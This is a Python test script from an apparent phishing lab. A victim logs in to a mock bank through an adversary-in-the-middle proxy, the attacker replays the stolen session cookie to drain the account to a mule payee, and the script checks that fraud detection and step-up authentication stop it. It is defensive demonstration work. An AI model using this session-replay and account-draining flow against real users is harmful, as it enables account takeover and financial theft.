"""
Phase 3 proof — KingBank. The victim is phished through the KINGNET proxy (creds +
session cookie stolen, exactly like KingMail). Then the attacker uses the stolen session
from their own machine to DRAIN the account. Detection flags it; a step-up policy refuses
it. Invoked by scripts/bank_test.sh.
"""
import os
import sys

import httpx
import pyotp

KB = os.environ.get("KINGBANK_URL", "http://localhost:8083")
PX = os.environ.get("PROXY_ORIGIN", "http://localhost:8446")
CONSOLE = os.environ.get("CONSOLE_URL", "http://localhost:9000")
USER, PW, TOTP = "victim@kingbank.lab", "Autumn2026!", "JBSWY3DPEHPK3PXP"
MULE = "KB-9999"
ok_all = True


def check(cond, msg):
    global ok_all
    print(("  \033[1;32m✓\033[0m " if cond else "  \033[1;31m✗\033[0m ") + msg)
    if not cond:
        ok_all = False


print("\n== victim signs in THROUGH the KINGNET proxy (phished) ==")
victim = httpx.Client(timeout=15, follow_redirects=True)
victim.post(f"{PX}/login", data={"email": USER, "password": PW})
victim.post(f"{PX}/otp", data={"code": pyotp.TOTP(TOTP).now()})
stolen = victim.cookies.get("kingbank_session")
check(stolen is not None, "victim reached the bank; a session cookie exists")

print("\n== the proxy/console captured the goods ==")
dash = httpx.get(f"{CONSOLE}/", timeout=15).text
check(PW in dash, "attacker console captured the PASSWORD")
check("kingbank_session" in dash, "attacker console captured the SESSION COOKIE")

print("\n== attacker replays the stolen session to DRAIN the account ==")
attacker = httpx.Client(timeout=15, headers={
    "User-Agent": "KINGNET-fraud/1.0 (attacker)", "X-Lab-Geo": "Amsterdam, NL (VPS)", "x-api": "1"},
    cookies={"kingbank_session": stolen or ""})
r = attacker.post(f"{KB}/pay", data={"payee": MULE, "amount": "60000"})
check(r.status_code == 200 and r.json().get("ok"), f"fraudulent transfer accepted (HTTP {r.status_code})")
bal = r.json().get("balance") if r.status_code == 200 else None
check(bal is not None and bal < 75000, f"balance drained to R{bal} (was R75000.00)")

print("\n== detection: the fraud is flagged ==")
sec = httpx.get(f"{KB}/security", timeout=15).text
check("new device" in sec.lower(), "flagged: new device")
check("impossible travel" in sec.lower(), "flagged: impossible travel")
check("new payee" in sec.lower(), "flagged: new payee")

print("\n== defense: require per-transaction step-up, then retry the fraud ==")
httpx.post(f"{KB}/admin/policy", json={"require_step_up": True}, timeout=15)
r2 = attacker.post(f"{KB}/pay", data={"payee": MULE, "amount": "1000"})
check(r2.status_code == 401 and r2.json().get("step_up") is True,
      f"stolen session alone can no longer pay (HTTP {r2.status_code})")

victim.close()
attacker.close()
print("\nRESULT:", "PASS" if ok_all else "FAIL")
sys.exit(0 if ok_all else 1)
